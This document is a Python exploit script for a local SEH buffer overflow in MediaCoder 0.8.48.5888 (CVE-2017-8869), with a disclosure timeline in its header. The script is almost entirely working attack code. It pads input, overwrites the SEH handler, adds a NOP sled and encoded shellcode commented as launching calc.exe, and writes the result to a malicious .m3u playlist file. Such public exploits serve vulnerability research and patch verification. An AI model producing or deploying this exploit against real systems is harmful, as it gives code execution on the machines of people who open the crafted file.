#!/usr/bin/python
# Exploit Title      : MediaCoder 0.8.48.5888 Local Buffer Overflow (SEH)
# CVE				 : CVE-2017-8869
# Exploit Author     : Muhann4d @0xSecured
# Vendor Homepage    : http://www.mediacoderhq.com
# Vulnerable Software: http://www.mediacoderhq.com/mirrors.html?file=MediaCoder-0.8.48.5888.exe
# Vulnerable Version : 0.8.48.5888
# Fixed version      : 0.8.49.5890 http://www.mediacoderhq.com/mirrors.html?file=MediaCoder-0.8.49.5890.exe
# Category           : Local Buffer Overflow
# Tested on OS       : Windows 7 Pro SP1 32bit
# How to             : Open MediaCoder then drag & drop the .m3u file in it and then press the START button.
#					   or just write click on the .mu3 file .. open with .. MediaCoder
# Timeline 	: 
# 2017-05-05: Vulnerability discovered, vendor has been contaced
# 2017-05-08: Vendor replied denying it .."I believe this was an old issue and no longer exists in the latest version" 
# 2017-05-09: A POC sent to the vendor.
# 2017-05-11: New version is released. According to http://blog.mediacoderhq.com/changelog/
# 2017-06-26: Exploit released.

print "MediaCoder 0.8.48.5888 Local Exploit By Muhann4d @0xSecured"
from struct import pack
 
junk = "http://" + "\x41" * 361
nseh = pack('<I',0x909006eb)
seh = pack('<I',0x66017187)
nops= "\x90" * 20
#calc.exe
shell=("\xbe\xb6\x06\x32\x7a\xda\xd1\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x31\x31\x72\x13\x03\x72\x13\x83\xea\x4a\xe4\xc7\x86\x5a\x6b"
"\x27\x77\x9a\x0c\xa1\x92\xab\x0c\xd5\xd7\x9b\xbc\x9d\xba\x17"
"\x36\xf3\x2e\xac\x3a\xdc\x41\x05\xf0\x3a\x6f\x96\xa9\x7f\xee"
"\x14\xb0\x53\xd0\x25\x7b\xa6\x11\x62\x66\x4b\x43\x3b\xec\xfe"
"\x74\x48\xb8\xc2\xff\x02\x2c\x43\xe3\xd2\x4f\x62\xb2\x69\x16"
"\xa4\x34\xbe\x22\xed\x2e\xa3\x0f\xa7\xc5\x17\xfb\x36\x0c\x66"
"\x04\x94\x71\x47\xf7\xe4\xb6\x6f\xe8\x92\xce\x8c\x95\xa4\x14"
"\xef\x41\x20\x8f\x57\x01\x92\x6b\x66\xc6\x45\xff\x64\xa3\x02"
"\xa7\x68\x32\xc6\xd3\x94\xbf\xe9\x33\x1d\xfb\xcd\x97\x46\x5f"
"\x6f\x81\x22\x0e\x90\xd1\x8d\xef\x34\x99\x23\xfb\x44\xc0\x29"
"\xfa\xdb\x7e\x1f\xfc\xe3\x80\x0f\x95\xd2\x0b\xc0\xe2\xea\xd9"
"\xa5\x13\x1a\xd0\x33\x83\x85\x81\x7e\xc9\x35\x7c\xbc\xf4\xb5"
"\x75\x3c\x03\xa5\xff\x39\x4f\x61\x13\x33\xc0\x04\x13\xe0\xe1"
"\x0c\x70\x67\x72\xcc\x59\x02\xf2\x77\xa6")

junkD = "D" * (2960 - (len(junk + nseh + seh + nops + shell)))
exploit = junk + nseh + seh + nops + shell + junkD
  
try:
    file= open("Exploit.m3u",'w')
    file.write(exploit)
    file.close()
    raw_input("\nExploit has been created!\n")
except:
    print "There has been an Error"
	